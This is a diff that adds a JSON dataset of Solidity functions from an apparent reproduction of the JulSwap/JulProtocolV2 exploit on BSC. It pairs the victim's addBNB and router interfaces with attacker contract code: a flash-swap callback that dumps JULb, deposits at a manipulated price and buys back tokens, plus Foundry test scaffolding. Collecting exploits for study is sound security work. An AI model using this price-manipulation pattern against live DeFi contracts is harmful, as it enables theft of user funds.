@@ -1,0 +1,121 @@
+[
+  {
+    "contract/interface": "IJulProtocolV2",
+    "source_type": "victim_contract",
+    "function_name": "addBNB",
+    "original_code": "    function addBNB()\n        public\n        payable\n        returns (\n            uint256 amountToken,\n            uint256 amountBNB,\n            uint256 liquidity\n        )\n    {\n        require(msg.value >= MINIMUM_DEPOSIT_AMOUNT, \"Insufficient BNB\");  \n        \n        uint ethAmount = msg.value ;\n\n        uint reserveA;\n        uint reserveB;\n\n        (reserveA, reserveB) = BSCswapLibrary.getReserves(\n            BSCSWAP_FACTORY,\n            WBNB,\n            TOKEN\n        );\n\n        uint tokenAmount = BSCswapLibrary.quote(ethAmount, reserveA, reserveB); \n\n        uint256 balance = JulToken.balanceOf(address(this));\n        require(balance >= tokenAmount, \"Insufficient JUL token amount\");\n\n        address payable spender = address(this);\n\n        JulToken.approve(router02Address, tokenAmount);\n\n        (amountToken, amountBNB, liquidity) = bscswapRouter02.addLiquidityBNB{\n            value: ethAmount\n        }(TOKEN, tokenAmount, tokenAmount, 1, spender, block.timestamp);\n\n        if(protocolusers[msg.sender].lastDepositedDate == 0) //first deposit\n        {\n            protocolusers[msg.sender].lastDepositedDate = now;\n        }\n        else\n        {\n            calculateInterest(msg.sender);\n        }\n        protocolusers[msg.sender].amountBNB = protocolusers[msg.sender].amountBNB + ethAmount;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IBNBRouter",
+    "source_type": "victim_contract",
+    "function_name": "swapBNBForExactTokens",
+    "original_code": "    function swapBNBForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IBNBRouter",
+    "source_type": "victim_contract",
+    "function_name": "swapExactTokensForBNB",
+    "original_code": "    function swapExactTokensForBNB(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JulSwap",
+    "source_type": "attacker_contract",
+    "function_name": "BSCswapCall",
+    "original_code": "    function BSCswapCall(address, uint256 amount0, uint256, bytes memory) external {\n        IERC20(JULb).approve(Router, type(uint256).max);\n\n        address[] memory path0 = new address[](2);\n        path0[0] = JULb;\n        path0[1] = wBNB;\n        IBNBRouter(Router).swapExactTokensForBNB(amount0, 1, path0, address(this), 1_622_156_211);\n\n        IJulProtocolV2(JulProtocolV2).addBNB{value: 515 ether}();\n\n        uint256 amountOut = 70_310_631_895_687_061_183_551;\n        address[] memory path1 = new address[](2);\n        path1[0] = wBNB;\n        path1[1] = JULb;\n        IBNBRouter(Router).swapBNBForExactTokens{value: 885.146882180525770269 ether}(\n            amountOut, path1, address(this), 1_622_156_211\n        );\n        IERC20(JULb).transfer(BSCswapPair, 70_210_631_895_687_061_183_551);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JulSwap",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "JulSwap",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JulSwap",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JulSwap",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JulSwap",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JulSwap",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", blocknumToForkFrom);\n        deal(wBNB, address(this), 1000 ether);\n        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit\n        fundingToken = address(0);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JulSwap",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JulSwap",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JulSwap",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JulSwap",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JulSwap",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JulSwap",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JulSwap",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public balanceLog {\n        //implement exploit code here\n        uint256 amount0Out = 70_000_000_000_000_000_000_000;\n        uint256 amount1Out = 0;\n        IUniswapV2Pair(BSCswapPair).swap(amount0Out, amount1Out, address(this), \"1\");\n    }\n\n",
+    "description": ""
+  }
+]
